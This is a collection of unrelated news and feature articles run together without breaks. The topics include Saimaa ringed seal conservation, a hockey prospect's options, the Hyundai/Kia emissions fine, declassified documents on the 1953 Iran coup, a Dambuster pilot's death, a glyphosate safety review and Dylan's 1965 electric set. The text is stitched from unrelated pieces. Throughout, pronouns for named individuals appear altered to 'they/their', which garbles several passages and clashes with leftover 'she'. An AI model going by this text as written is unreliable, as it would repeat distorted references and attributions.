Recent mild winters at Lake Saimaa have weakened ice and snow conditions, and without the shelter of lairs pups are more vulnerable to thermal stress and predation. In addition, female-pup pairs are exposed more easily to human caused disturbance, and interruption in nursing may reduce the amount of energy that a pup receives.
All of this has contributed to slower pup growth and increased mortality. If that doesn't turn around, the seals simply won't be able to recover.
Can humans help? One of the authors of the new paper says that it is possible—with a little elbow grease.
As part of their University of Eastern Finland PhD thesis, Miina Auttila explored the idea of supplementing those snow dens by collecting nearby snow and shoveling it into artificial drifts.
It took some trial and error. “In first study year we thought that using the snow pushers to pile the snowdrifts would change the structure of snow similar way as wind does,” they say. The snow drifts looked attractive and female seals moved in and made lairs, but the drifts collapsed earlier than natural, wind-drifted snow.
After that they tried a few different methods to pack the snow. The best solution turned out to be the easiest. They just walked on it until it compressed enough to be stable.
Saimaa seals tend to try to use the same den sites year after year, but the new drifts proved attractive substitutes for sites that had disappeared or become unusable. Auttila reports that during their study, which lasted from 2010 to 2012, seals made lairs in 56 percent of the artificial snowdrifts.
With that success in hand, the first official use of artificial snowdrifts as a conservation tool took place in 2014. They have already had a positive impact. “Altogether, 240 snowdrifts were piled around the breeding area of the Saimaa ringed seal just before the seals' breeding season, and over 90 percent of the pups born during that year were born in the human-made snowdrifts,” Auttila says.
This is just the beginning. More snowdrifts were built this year and Auttila says the method may become a permanent part of the “conservation toolkit” for Saimaa ringed seals. They recently became a conservation biologist with Metsähallitus, the Finnish agency that manages state-owned land and water, where she's working on long-term project to safeguard the seals. One of their tasks right now is to develop “a plan and organizing the implementation of human-made snowdrifts if they are needed due to poor snow conditions.”
Obviously this won't be enough to save the seals on its own. The paper in Marine Mammal Science reveals that the species still has a high infant and juvenile mortality rate, mostly because their body condition and blubber levels decline shortly after weaning. They also face continued pressure from fishermen, who catch and kill too many juvenile seals. The paper recommends shortening the spring fishing season when young seals need to catch as much prey as possible in order to boost the species' survival rates.
None of this may be enough in the face of climate change, but for the Saimaa ringed seal it's at least a start.

On Tuesday night the Erie Otters and the London Knights clashed in Game 7 of their second-round series of the OHL playoffs.
The Otters came away with the victory after Carolina Hurricanes prospect Warren Foegele buried their chance behind Tyler Parsons at 10:40 of the first overtime.
From a Canucks perspective, this puts an end to top prospect Olli Juolevi's season. Finishing with three goals and five assists in 14 OHL playoff games, Juolevi was a workhorse for the Knights. Canucks general manager Jim Benning stated previously that when Juolevi's season ended with the Knights, they would not report to the Comets, so that they could get a jump on their offseason. That became a moot point when the Comets failed to make the AHL playoffs.
So with that, we look ahead to next season and the options available to the Canucks 2016 first round pick.
NHL
If the Canucks are fully embracing the rebuild, then having Juolevi make the leap to the NHL next season isn't out of the question. But two factors will affect that. One being the young Finn's performance in training camp and what other moves the Canucks make. At the moment, the Canucks would enter camp with the following defencemen:
Alex Edler – Chris Tanev
Ben Hutton – Erik Gudbranson
Luca Sbisa – Troy Stecher
Alex Biega
All the above players are currently signed for next season or are a pending restricted free agent. It's clear that there are seven spots filled. The Canucks can could see further change to that grouping in a number of different ways.
Luca Sbisa is selected in the NHL expansion draft
Ben Hutton, rumoured to be shopped, is traded
Alex Biega is waived and assigned to Utica
There are other options available, such as moving Chris Tanev, etc. but the three mentioned above are the easiest and most likely ones to happen. Not all three will happen, but if one happens, that opens up another spot for Juolevi in training camp. Even if they aren't on the opening night roster, as we've seen, it's only a matter of time before injuries happen and Juolevi is playing regularly.
The news of Nikita Tryamkin returning to the KHL next season does help Juolevi cracking the opening night roster. Unless the Canucks obtain another defenceman, there is a spot to be had.
There would be multiple benefits to having Juolevi in the NHL next season, but there would also be fears of strength and rushing them into the league. A lot will depend on the performance of the recent 5th overall pick, but it appears that their goal is to force themselves onto the roster next year
Juolevi says the mindset is to make the #Canucks, "It's all on me now, I need to to do the job and make the roster." #Canucks — Rick Dhaliwal (@DhaliwalSports) April 19, 2017
CHL
If Juolevi is unable to crack the Canucks roster, the next option is to re-assign them to the London Knights in the OHL.
Due to the CHL/NHL agreement, Juolevi is unable to be assigned to the AHL. The basic premise of the agreement is as follows:
Players drafted and playing for CHL teams are ineligible to play in the professional minor leagues (AHL, ECHL) until they are 20 years old (by December 31st of that year) or have completed four years in major juniors.
Juolevi is old enough to play in the AHL, as their minimum age is 18, but due to this transfer agreement, they would be forced to return to the OHL. If Jokerit, who Juolevi played for before joining London, had loaned them to the Knights, they would be allowed to play in the AHL. Some examples of this occurring are Julius Honka (DAL), Alexander Nylander (BUF) and Nico Hischier (2017 draft eligible).
Like the NHL, there are some benefits and drawbacks to this. If Vancouver reassigns Juolevi to London, they will once again be the workhorse of the backend. There will be some graduation for the Knights, but they are a perennial challenger for the OHL title.
The 6'3″ defenceman would be eligible for the 2018 World Juniors – so that would be a great opportunity for them if they were to find themselves back in the OHL.
Loan to Europe
Another option that may present itself if Juolevi fails to make the Canucks out of camp is to loan them to a European team. This option provides multiple benefits for the organization and their prized prospect.
They would be able to play against men, something that they haven't done yet, and push himself. Whoever were to take them on loan from the Canucks would also be able to have them attend the WJHC. Furthermore, the European seasons usually end prior to the NHL season, so if the Canucks so choose, they could then recall Juolevi from loan and have them play a few games in the NHL to close out the season.
We are obviously not privy to who or where would be interested in adding Juolevi, but it's a fair assumption that a team in Finland (Liiga) would be interested in adding a young Finnish star. If not, then the SHL or NLA (Switzerland) are other great options.
Like the CHL, once Juolevi goes there, they are likely gone until the conclusion of the European teams season.
Other players who have done this Nicklas Jensen (VAN at the time) and Nikolay Goldobin (SJS at the time).
Contract Ramifications
Olli Juolevi was signed to an Entry Level contract by the Canucks on August 5th, 2016. As per section 9.2 of the NHL/NHLPA CBA, they were '18 years old':
This resulted in the contract sliding for this season, as they failed to play in 9 NHL games. The NHL explains this in section 9.1d (i)
The key here is because Juolevi signed their ELC when they were 18 years old, and the contract has already slid; it can slide again for their 19-year-old season. So, if Juolevi is assigned to the CHL or loaned to a team in Europe, the ELC will slide for another year – giving the Canucks three years of the contract starting in 2018-19.
If Juolevi does appear in 10 NHL games this upcoming season, the ELC burns.
One important note is that if Juolevi is assigned to the CHL or loaned to Europe before playing their nine games, their contract will not count towards the 50 contract limit. If they were to come back at the conclusion of a European season, as long as they don't appear in 10 contests, the contract still doesn't count towards the 50.
Conclusion
The CHL/NHL transfer agreement throws a wrench into the whole situation as players like Juolevi likely don't have too much more to prove at that level. Juolevi helped guide London to a Memorial Cup championship in 2016 and had a very strong showing this year in the OHL playoffs.
Ideally, if Juolevi were unable to crack the opening night roster, the Canucks would be able to assign them to the AHL until injuries hit and then recall them once there was a semi-consistent spot in the lineup. But alas, that isn't an option.
It's fair to believe that the Canucks will give Juolevi every chance to make their NHL squad out of camp. The loss of Tryamkin for next season (at least) does open the door here. However, if Canucks management feels they aren't quite ready, then loaning them to a team in the SHL or Liiga is probably the other best course of action.
They would still be able to play a significant role for Finland at the World Juniors and challenge themselves against men.
Monster Hunter is celebrating its 10th anniversary with a ... guitar?
ESP Guitars has modeled an axe on a sword — the in-game Rathalos Firesword, to be precise. It is not cheap. Available in Japan for 2.3 million yen, that converts to more than $22,000 U.S. It does come with a case, however.
Capcom has partnered with others to create high-end collectibles commemorating the series, from shirts to charm necklaces to a ... golf bag, completed with Monster Hunter-themed golf balls and ball markers. That has yet to be priced but, as they say, if you have to ask, you probably cannot afford it.

The Obama administration Monday announced a settlement of more than $300 million with South Korean automakers Kia and Hyundai for understating greenhouse-gas emissions from nearly 1.2 million of their cars and trucks.
The record fine of $100 million and other penalties were described as the largest enforcement action of its kind under the federal Clean Air Act, in an unusual case involving emissions credits earned by manufacturers for producing low-emission vehicles, Environmental Protection Agency and Justice Department officials said in announcing the agreement.
Under the terms of a voluntary consent decree, Hyundai and Kia also will forfeit 4.75 million greenhouse-gas credits, estimated to be worth more than $200 million. Car companies earn the credits for manufacturing vehicles that emit less greenhouse-gas pollution than the law requires.
“Businesses that play by the rules shouldn't have to compete with those breaking the law,” said EPA Administrator Gina McCarthy, who announced the settlement at a joint news conference with Attorney General Eric H. Holder Jr. “This settlement upholds the integrity of the nation's fuel economy and greenhouse-gas programs and supports all Americans who want to save fuel costs and reduce their environmental impact.”
The consent decree stems from a complaint filed by federal regulators and California state officials that accuses the two companies of misstating the emissions performance of more than a million cars and SUVs from the 2012 and 2013 model years. The inaccurate figures allowed the companies to earn greater profits while also misleading consumers about the environmental impact of their cars, administration officials said.

The problem, discovered during routine auditing by EPA officials, involved four Hyundai models — the Accent, Elantra, Veloster and Santa Fe — as well as Rio and Soul vehicles made by Kia.
Both companies agreed to reform their emissions-testing procedures after EPA investigators discovered that the companies were basing their pollution figures on the most favorable test results instead of averages from large numbers of tests.
Hyundai officials did not acknowledge wrongdoing in the consent decree. In a statement, the company said it had cooperated fully with EPA officials after the problem was discovered, adding that Hyundai was following auditing procedures approved by federal regulators.
“Hyundai has acted transparently, reimbursed affected customers and fully cooperated with the EPA throughout the course of its investigation,” said David Zuchowski, president and chief executive of Hyundai Motor America. “We are pleased to put this behind us, and gratified that even with our adjusted fuel-economy ratings, Hyundai continues to lead the automotive industry in fuel efficiency and environmental performance.”
Chris Hosford, a Hyundai spokesperson, said in an e-mailed statement that “Hyundai's view is that this was an honest mistake and there was a lack of clarity/broad latitude in EPA rules and guidance that resulted in the issues outlined by the government.”
Hosford said the temperature range for running tests was one issue that affected the fuel-efficiency numbers.
“EPA has acknowledged that its rules and guidance need to be updated,” they added.
Hyundai has also been the target of a lawsuit by South Korean consumers who say the company exaggerated fuel-efficiency numbers of its Santa Fe model. The company in August apologized and offered customers compensation for extra fuel costs. In 2012, the EPA said Hyundai and Kia issued incorrect fuel-efficiency figures for more than a third of the vehicles they had sold over the previous two years. At that time, Hyundai blamed “procedural errors.”
Jeffrey R. Holmstead, a partner at the law firm Bracewell & Giuliani and who headed the EPA's air and radiation office under President George W. Bush, called the settlement “huge” given the fact that carbon dioxide doesn't have the same immediate public heath impact as other air pollutants.
“It shows they're serious about taking on greenhouse-gas emissions,” Holmstead said of administration officials.
Other carmakers are on alert. In June, Ford Motor cut the estimates on the gas mileage stickers on six models for the years 2013 and 2014, including its hybrid, plug-in hybrid and Fiesta models. The company mailed “goodwill” checks to customers to compensate for the estimated average fuel cost difference between the old and new fuel-efficiency estimates.
“A key purpose of this settlement is to send a message to other companies to stop misrepresenting how much pollution their vehicles emit,” said Daniel Becker, director of the nonprofit Safe Climate Campaign and an expert on fuel-efficiency regulations. Noting Hyundai's and Kia's loss of greenhouse-gas credits, Becker said, “there are real world consequences for polluters when they lie about their pollution.”

Q: We're preparing for this year's onslaught of Japanese beetles and hoping for the best. The local garden centers tell us that the pesticides that kill Japanese beetles are “safe” on vegetables. We want to preserve the good insects as best we can. Do you have a suggestion? Bt? Neem?
A: I've been seeing the year's first Japanese beetles on my roses (of course) and rhubarb.
Bt (made from the caterpillar-killing bacterium Bacillus thuringiensis) won't do anything for adult Japanese beetles. But neem oil is a natural and so-called “soft” repellent spray that's labeled for use on vegetables. I've found it to be somewhat effective but not 100 percent.
Something else to try is VeggiePharm, a spray that's a blend of soap, peppermint oil and soybean oil. I haven't tried it myself, but it's got about as good a review as anything non-chemical against Japanese beetles. Read more about it at http://www.pharmsolutionsinc.com/veggie_pharm.html . It's available directly there, and I've seen it locally at a few garden centers.
Some people mix their own concoctions of soap, garlic, hot peppers, oil and even blended-up dead beetles, but I can't vouch for any of those. You'll find lots of formulas online. If you go that route, try small amounts first so you don't harm your plants.
Other options: Drape floating row covers to protect your non-fruiting crops; hand-pick and squish as many beetles as you can grab; spray clusters of them with insecticidal soap (no residual help, though, if you can't hit them directly), and buy beetle traps for all of your neighbors to draw beetles away from your yard.
Former Iranian Premier Mohammed Mossadegh is sentenced to three years solitary confinement by a military court in Tehran, Iran, on Dec. 21, 1953.
The State Department has finally released a much-awaited volume of internal documents from 1951 to 1954, the period during which Mohammad Mossadeq was prime minister of Iran. The department is obliged to publish 30-year-old documents in its annual series entitled Foreign Relations of the United States (FRUS). The original volume for the Mossadeq period, published in 1989, was so skimpy—with long gaps of any communications between the embassy in Tehran and the department in Washington, especially during heightened crises—that many academics, including the American Historical Association, lodged official complaints.
In 1991, the State Department, under congressional pressure, promised to issue a new version of the volume. This was delayed at first because the clearance was needed from a “third party” (UK) mentioned in some documents, and then because the US did not want to “jeopardize” the on-going nuclear negotiations with Iran. The present volume, billed as a “retrospective,” contains 375 documents totaling 970 pages. It includes not only embassy communications but also the minutes of the meetings of the National Security Council and the CIA on discussions of Iran.
Although many scholars of Iran anticipated new revelations about the actual overthrow of Mossadeq in August 1953, few expected such information. Even unclassified documents omit details on “operations,” especially on agents, informants, money transactions, and taboo activities. Moreover, we already knew much of what is worth knowing about that actual coup from the well-known “Wilber document.”
Donald Wilber, a CIA academic in charge of the “psychological warfare” side of the venture, had been assigned in 1954 to compile a detailed internal report. This report, entitled “Overthrow of Premier Mossadeq of Iran,” is a genuine primary source. It was designed as an eyes-only handbook for future coups. It was by no means intended to enhance the agency's public image—as some royalists in Iran like to claim. It was leaked in 2000 through The New York Times and received much coverage through the Internet, numerous book reprints, and translations in Iran. The only significant segment missing from the leaked version was an appendix listing the Iranian politicians, journalists, newspaper editors, clergymen, senators, and parliamentary deputies on the CIA payroll. Not surprisingly, this annex does not appear in the “retrospective.” In fact, the Wilber report does not appear at all—probably because of the references to the UK.
The new volume may not reveal much new about the actual coup, but it does provide a vast amount of information on US involvement in Iran. It is a goldmine of astounding information—especially on three important arenas.
Direct Interference
First, it reveals how deeply the US—not just the CIA but also the US embassy headed by Ambassador Loy Henderson—was immersed in the nitty-gritty of internal day-to-day Iranian politics. Every so often Henderson would pronounce with a straight face that the US had the principled policy of never interfering in another country's internal politics. Then they would plunge in without batting an eye.
They consistently encouraged the shah to get rid of Mossadeq—this pressure started soon after Mossadeq was elected prime minister. They vetted a list of some 18 candidates to replace Mossadeq. They helped engineer Mossadeq's brief replacement by Qavam in July 1952—this sparked the 30th Tir (July 20) Uprising. They decisively intervened in early 1953 to prevent the shah from leaving the country—triggering what became known as the 8th Esfand (February 28) Crisis when thugs tried to break into Mossadeq's home. The shah later thanked Henderson for having saved the monarchy on that fateful day. Henderson also did their very best to drive a wedge between Mossadeq and Ayatollah Kashani, the main cleric involved in national politics. They buttered up the latter as a font of religious wisdom worthy of being a leader of not just Iran but of the whole Islamic world. This meddling in internal politics may well explain why the State Department was so reluctant to release these embassy dispatches.
At the same time the embassy was active through the CIA in a whole array of ventures long before the climactic coup. It vetted candidates for parliament—the CIA congratulated itself for its “great success” in the 1952 parliamentary elections. It recruited journalists, clerics, and politicians. It experimented with outside-the-box ideas such as creating a “Titoist Party.” It encouraged the Fedayyan-e Islam, a small gang of religious fanatics, to take “direct action” against government supporters. It waged constant “psychological warfare” that included hiring goons to beat up demonstrators and newspaper sellers as well as resorting to “poison pens, personal denunciations, and rumor mongering.” These activities were all categorized as “moral sabotage.”
Second, the new documents show categorically that the idea of a coup was not something cooked up by John Foster Dulles, the new secretary of state, only after Eisenhower had entered the White House in January 1953. During the previous two years, under the Truman administration, both Allen Dulles and Kermit Roosevelt had been well ensconced within the CIA directorate obsessing about Iran and advocating policies similar to the British—i.e. the removal of Mossadeq. The documents reveal a continual tug-of-war between the two and more cautious members of the National Security Council.
The back-and-forth focused on the National Intelligence Estimate (NIE) for Iran. The original 1952 estimate had been fairly down-to-earth, concluding that the Mossadeq administration had durability and the communist party was in no position to muster a challenge. Dulles and Roosevelt, in sharp contrast, constantly pushed for a revised NIE that would include alarm bells on how the “mentally unstable” Mossadeq was on their last legs, and how the communist party was on the verge of taking power—in short, the sky was about to fall unless the CIA took direct action.
The Issue of Oil
Finally, the volume challenges the conventional view that the coup had little to do with oil but much to do with the Cold War. The CIA's internal instruction stressed that agents should make “every effort to de-emphasize the oil issue.” The NSC agreed only two weeks after the oil was nationalized that “we can not be neutral in the dispute and must give vigorous support to Britain…Iran has broken contract, set a bad precedent for other countries such as Iraq, and has created a contagious situation which we should do all in our power to check.” Eisenhower, who liked to keep distant from sordid details, declared categorically in rare interventions at cabinet meetings that “We have to respect the enormous investments the British have made in Iran, and their proposals have been wholly reasonable. We don't want to break with the British” and “The example [of successful nationalization] might have grave effects on US oil concession in other parts of the world.”
These British proposals mentioned by Eisenhower—endorsed by the US and the World Bank and, according to conventional wisdom, rejected by Iran—would have left the issue of compensation to international arbitration. In fact, Mossadeq never rejected these final proposals. Instead they requested clarification that compensation would be based on the current value of the oil installations, not on imagined profits projected to the end of the century. They suspected—documents reinforced their suspicions—that the British wanted such an “astronomical sum” that Iran would have been reduced to state of “bondage” for decades to come. This would have acted as a lethal deterrence for any other country tempted with the notion of oil nationalization. A confidential UK message to the US stated: “The overriding consideration of compensation must be such as not to provide a reward for the tearing up of contractual obligations or to disturb the pattern of world oil prices.”
Secretary Dulles, in their final message to Mossadeq, was quite blunt: “There is considerable sentiment in the US to the effect that a settlement based on the payment of compensation merely for losses of the physical assets which have been nationalized would not be a reasonable and such an agreement might tend to weaken mutual trust between nations engaged in friendly economic intercourse.“ Once Mossadeq was removed, the new National Intelligence Estimate stipulated: “Settlement must not establish a precedent adversely affecting established oil industry in a way inimical to US interests.” Although many insist the coup had nothing to do with petroleum, the 375 documents end with a grand finale summarizing the 1954 Oil Consortium Agreement. This agreement in effect de-nationalized the industry and handed control over to the major Western oil companies.
The terms “alternative facts,” “deep states,” and “electoral collusion” may not have been in circulation back in 1951-54. But the concepts were very much present in the US tool kit. Anyone interested in the workings of imperialism in a semi-colonial state would learn much wading through this morass of badly written and turgid double-speak.

Death of the New Zealand squadron leader means just two crew members remain from the 1943 Dambusters bombing raids
The last surviving pilot from the Dambusters raids has died at the age of 96. Les Munro died on Tuesday morning in hospital in Tauranga in the Bay of Plenty in their native New Zealand.
Their death means there are just two survivors from the 1943 bombing raids on Germany's Ruhr dams: George “Johnny” Johnson, from the UK, who was a bomb-aimer; and Canadian front-gunner Fred Sutherland.
In a statement, the New Zealand Bomber Command Association announced the “extremely sad news”, saying: “Our New Zealand Bomber Command Association patron, and well known Dambuster pilot, Les Munro passed away last night following a spell in hospital with heart problems. So, so sad. They were a mighty man.”
Along with Leonard Chambers, who died in 1985, John Leslie Munro was one of two New Zealand members of the Dambusters crew. They joined the Royal New Zealand air force in 1941, qualifying as a pilot the following year.
On 16 May 1943, as part of 617 squadrons, Munro piloted a Lancaster bomber in Operation Chastise, later immortalised as the Dambusters raids. Although Munro's aircraft suffered flak damage and was forced to turn back before it could carry out its attack on the Sorpe dam, the raids were successful in devastating the Möhne and Edersee dams.

The effects of the so-called bouncing bombs caused catastrophic flooding in the Ruhr valley, destroying hydroelectric power stations and factories. More than 1,600 people on the ground are thought to have been killed.
Of the 133 crew members who took part in the raids, 53 were killed. Munro was among those who were awarded the Distinguished Service Order for their part in the attack.
New Zealand prime minister John Key led the tributes on Tuesday, calling Munro “a remarkable man who led a remarkable life”.
John Key (@johnkeypm) Really sad to hear of Les Munro's death, New Zealand has lost a remarkable man who led a remarkable life.
Air vice-marshal Mike Yardley, head of the New Zealand air force, also paid their respects:
After the war, Munro returned to New Zealand and later became mayor of Waitomo district, on the north island.
Peter Wheeler, administrator for the New Zealand Bomber Command Association, said: “To lose someone is always difficult, but to lose someone like Les, who had a special aura, is pretty tough.
“In our association the youngest is 89. We look to people like Les and we think they are invincible. But we have a feeling in bomber command that they could have died 70 years ago.”

Earlier this year, Munro announced their intention to sell their war medals, hoping to raise £50,000 for the upkeep of the Bomber Command memorial, which commemorates the 55,573 men who died in the second world war bombing campaign. Lord Ashcroft, the Tory peer who endowed London's Imperial War Museum with the world's largest collection of Victoria Cross medals, donated £75,000 to the memorial to allow Munro instead to donate their gallantry awards to the Museum of Transport and Technology (Motat) in Auckland.
At a ceremony at Motat in April, Munro handed over their gallantry medals, flight logbooks and other wartime memorabilia. “I am comforted by the thought of my medals being situated in close proximity to the Lancaster at Motat as I flew all but one of my operations in these planes,” they said. “I appreciate very much indeed that they will have some relationship.”
Following news of Munro's death, Motat signalled its sadness, calling them “a true gentleman and hero”.
A hundred years ago, Great Britain had outsourced their Great War to India. India recruited 14,40,437 men and sent 13,81,050 of them overseas to fight for the British Empire between 1914 and 1918, saving Britain and their Allies from an ignominious defeat. Yet how much does the world and India themselves remember their role in the First World War ? A British Council survey has revealed some startling facts.The online survey released in February this year polled 7,488 respondents from India, UK, Egypt , France, Germany Russia and Turkey. The survey shows low-level of awareness among respondents in all countries about the Great War. India, in particular, seems to be really struggling to remember anything. About 27% of Indians in the survey believed their country fought against Britain in the war, while 51% knew their country fought for Britain. In comparison, 63% of UK respondents knew India fought by Britain's.Lieutenant Colonel (Retd) Anil Bhatt , the former spokesperson of the ministry of defence and Indian Army, blames the government of India and a "warped" education system for this lack of awareness. "India didn't just play a role in the two world wars, it played a decisive role. Yet our government has behaved like an ostrich all these decades. What national history is this that completely buries under the carpet the glorious role of our people in some of the major world events?" Bhat says.Ironically, Indians taking the survey showed greater awareness about the war itself than India's role in it. Only 4% of UK respondents knew the war had Latin American involvement (Brazil was the only South American country to be directly involved in the war) but 11% Indians were aware of the fact. The percentage of respondents from France, Russia, and Germany clicking the right option are in single digits.When Great Britain declared war on Germany on August 4, 1914, it had only about 1,50,000 combat-ready troops. It could commit only a little over 80,000 troops to the Western Front in the initial days of the war. In comparison, France had an army of 12,90,000 while Germany had an even bigger army of 19,00,000. The only professional standing army that Britain could bank upon in that crisis was the Indian Army. Britain would use this imperial reserve to the fullest throughout the war, and Indian troops would become the first fighting non-white colonial soldiers in Europe ever.According to the survey, 45% Indians believed Britain's conduct in the war positively affected their view of that country; 29% thought WWI continues to impact India and dictates their foreign policy; while 24% were of the view that India's contribution was misinterpreted. In fact, 22% believed that WWI strongly contributes to Indian national identity even today.Interestingly, 78% of respondents in France believed India stayed neutral in the conflict and didn't send any troops; in reality, over 1,40,000 Indian soldiers fought to defend French soil and thousands died while doing so. Incidentally, one of the largest Indian memorials in Europe is at Neuve Chappelle, France where nearly 5,000 Indian soldiers died during one of the bloodiest battles of the Great War in March 1915.
Glyphosate residues in Roundup Ready crops are ignored in safety studies
All but one of the animal feeding studies performed by independent researchers found significant effects from GM feed
Glyphosate residues in GM Roundup Ready crops are largely ignored in studies used for GMO regulatory safety assessments, according to a new review published in Environmental Sciences Europe.
The review also found that all but one of the animal feeding studies performed by researchers independent of the GMO industry found significant effects in animals fed GM Roundup Ready feed.
Overview shows glyphosate residues are “ignored issue”
The review looked at 30 published reports: 15 were compositional analyses of Roundup Ready crops and the other 15 were animal feeding studies with these crops.
The review, authored by Marek Cuhra from the Norwegian research institute Genøk, found that:
• 14 of 15 studies on composition and 6 of 15 animal feeding studies were performed by biotech industry companies
• Of the total 30 reviewed studies, only half used plant material produced with application of glyphosate herbicide (in line with actual farming practice)
• Only one of the 30 studies analyzed the material for glyphosate residues.
In short, the review concluded that glyphosate herbicide residues are an ignored issue in GMO composition and animal feeding studies.
Animal feeding studies: glyphosate data missing
Of the 15 animal feeding studies with Roundup Ready crops, 6 were performed by industry-affiliated researchers.
The remaining 9 studies were performed by researchers in government agencies, universities or other institutions assumed to be independent of the GMO industry.
Of the 6 studies performed by industry, plant material for feed was produced with application of glyphosate herbicide in only 3 studies (50%). In the 9 independent studies, plant material for feed was produced with application of glyphosate herbicide in 5 studies (56%). Unfortunately, no information on dosage was given in any of these studies (100%).
Only 3 of the 9 independent studies reported that relevant pesticide analysis was performed. Of the 6 industry studies, only one reported that pesticide analysis was performed. However, although glyphosate herbicide was the only pesticide applied in this study, the subsequent analysis measured numerous pesticides – but not glyphosate or the main metabolite of this chemical. The author of the new review commented that due to these “obvious shortcomings”, none of the six industry studies included analyses for relevant pesticides.
All but one independent animal feeding study found effects from GM feed
Based on the data from test animal performance and histology, the review states that 7 out of 15 studies found no significant effects from GM feed (produced from glyphosate-tolerant plant material). These 7 studies included one of the independent studies and all 6 industry studies. The remaining 8 independent studies did find significant effects from GM feed produced from glyphosate-tolerant plant material.
In the 8 studies reporting significant effects from GM feed, 2 studies related these effects to residues of glyphosate. One of the studies found that test animal growth and reproduction decreased as glyphosate residues increased.
Industry tests fail to meet acceptable scientific standards
The review found that industry tests of GM crops for regulatory assessments often fail to apply glyphosate herbicides in line with normal farming practice and fail to measure glyphosate residues.
The author states that crucial data from compositional analyses and animal feeding studies submitted to regulatory bodies as evidence as safety are not representative of the GM crops actually produced by farmers and delivered onto the commercial market.
In other words, the regulators are looking at irrelevant materials. The author concludes that industry tests on such materials do not meet acceptable scientific standards and that therefore “Such evidence should be disregarded and demands for new evidence should be brought forward”. This new evidence, the author adds, should be supplemented with independent research; alternatively, industry tests should be “competently supervised” to ensure that proper scientific standards are met.

Review of GMO safety assessment studies: glyphosate residues in Roundup Ready crops is an ignored issue
Cuhra, M. (2015). Environmental Sciences Europe, 27(1), 1-14.

Abstract
Background
Genetically modified glyphosate-tolerant cultivar varieties have been a commercial success widely known as Roundup Ready plants. As new glyphosate-tolerant varieties are introduced to satisfy agriculture demand, it is relevant to review the scientific evidence that documents the quality and safety of such biotechnology. Assessments of genetically modified glyphosate-tolerant plants are partly based on the reports from laboratory comparisons with non-modified plants (near-isogenic relatives). Such comparative testing is typically performed as analysis of plant material composition and in animal feeding studies. The material for testing is typically produced in test-fields set up as model environments. Most of this research is planned, performed and reported by researchers employed by biotech industry companies.
Perspective
The present paper aims to: (1) review 15 reports on compositional analyses of glyphosate-tolerant cultivars and 15 reports from animal feeding studies, (2) discuss recent data indicating glyphosate residue in Roundup Ready soybean, (3) outline recent developments of cultivars with increased tolerance to glyphosate.
Findings
The reviewed industry studies show methodological flaws: glyphosate-tolerant GM crops are designed for use with glyphosate herbicide. However, glyphosate herbicides are often not applied in test-study cultivation. In the studies where glyphosate herbicides were applied to growing plants, the produced plant material was not analyzed for glyphosate residues. This review has failed to identify industry studies that mention glyphosate residues in glyphosate-tolerant plants. This indicates that questions and evidence of importance for regulatory assessment have been systematically ignored. Independent research has investigated this issue and found that glyphosate-tolerant plants accumulate glyphosate residues at unexpected high levels. Glyphosate residues are found to have potential to affect plant material composition. Furthermore, these residues are passed on to consumers.
Conclusions
Industry studies are not sufficient for regulation. Despite decades of risk assessments and research in this field, specific unanswered questions relating to safety and quality aspects of food and feed from GM crops need to be addressed by regulators. Independent research gives important supplementary insight.
Crystal asked me to shock their Social Movement students at Cal State Monterey Bay. This felt like a high bar, so i offered to entertain them and provoke their thinking.
i presented about all the folks who had said the world was going to end unless we dramatically change our behavior (Club or Rome, Carl Sagan and nuclear winter, Rio 1992 and sustainability, the Peak Oil kids and now climate change). i put them in small groups and asked them to discuss what things they could do a better job of sharing.
But it was (predictably) the second part of the class which got the most eyebrows raised. I talked about polyamory and the astronomy of the Star family (and bragged about various Willowisms). The group exercise was to talk about their relationship with jealousy and report back on if they liked it and how they might change it.
But the thing that Crystal was most excited about was the idea that polyamory was a minority relationships model and as such was discriminated against in most peoples thinking. i pointed out that if you get involved in a poly relationship and it does not work out, you are quite likely to say “Polyamory does not work” or perhaps “Poly does not work for me”.
But if you are on the other side of a failed monogamous relationship you are more likely to say “Joe is an asshole”. It is quite possible that your poly relationship failed because Joe is an asshole, or because Joe is not even poly. We rarely say “Monogamy does not work”
[80% of students reported being shocked.]

“These things are etched in stone whether they're true or not.”
Not quite what you expect to hear from a man recalling the part they played in one of the most controversial moments in rock ‘n' roll history, but this is how Al Kooper remembers the moment when Bob Dylan went electric. On July 25, 1965, Dylan and their band faced a grimacing audience when they deviated from their anticipated program and played an electric set at the Newport Folk Festival. Backed by the Butterfield Blues Band, keyboardist Barry Goldberg, and 21-year-old organist Kooper — the man responsible for the organ lick that soars throughout “Like a Rolling Stone,” which had been released as a single less than a week prior to the Newport show — Dylan raced through a seventeen-minute set. Legend has it that Pete Seeger threatened to take an ax to the audio cables; the dicey mix was drowned out by the audience's vocal displeasure at the unpublicized amplification. In their recap for the Voice, Arthur Kretchmer wrote of how Dylan, the “greatest poet of this young generation,” was “booed for linking rhythm and blues to the paranoid nightmares of their vision.” Even as it transpired, the formative moment of Dylan's career had the potential to end it before it began.
Fifty years later, Kooper has spent a significant portion of the past few months reliving that set and the album — Highway 61 Revisited — that followed it, in both New York (at Lincoln Center Out of Doors) and Newport. The Queens native was a seasoned sideman before they were out of their teens; the “Like a Rolling Stone” session marked their first encounter with Dylan. They would go on to become a writer, arranger, and producer as well as a touch-of-gold session player, forming Blood, Sweat & Tears and producing Southern-rock revolutionaries Lynyrd Skynyrd's first three LPs. At Newport Folk on July 26, they joined David Rawlings, Gillian Welch, Dawes, Hozier, First Aid Kit, and a hefty portion of the remainder of the festival's 2015 lineup for its grand finale, '65 Revisited, a boisterous sing-along that included renditions of “Maggie's Farm” and “Like a Rolling Stone.” But while Kooper understands the mythology of that 1965 set, they point out that at the time, the Newport fiasco was more train wreck than triumph, the worst of three plugged-in performances that would define Dylan's electric summer.
“I think people were very upset that they only played for seventeen minutes, because they were the star for the entire weekend,” Kooper says of the Newport ado. “A lot of people sat through stuff that they didn't even understand so that they could see Bob play. I think that was what upset people, not specifically the electricity. I didn't hear any booing. I heard people going, ‘More! More! More!' By the time we played Forest Hills, all of this had been dispensed in the press, so they all sang along with ‘Like a Rolling Stone' and then booed at the end.”
That August 28 concert in Queens, with Robbie Robertson, Levon Helm, and Harvey Brooks rounding out Dylan's band, proved to be a far more polished show despite the riot it nearly caused. Jack Newfield noted in the Voice that Dylan and their backing musicians were booed “savagely” by the rowdy Forest Hills crowd, which was hypnotized by the first, unplugged solo set and enraged by the amplified, band-backed second. From Newfield's review: “After the first rock song, the Mods booed Dylan. After the second, someone called them a ‘scum bag,' and they replied cooly, ‘aw, come on now.' After the third the Mods chanted sardonically, ‘We Want Dylan.'”
This time, Kooper says, the musicians were prepared.
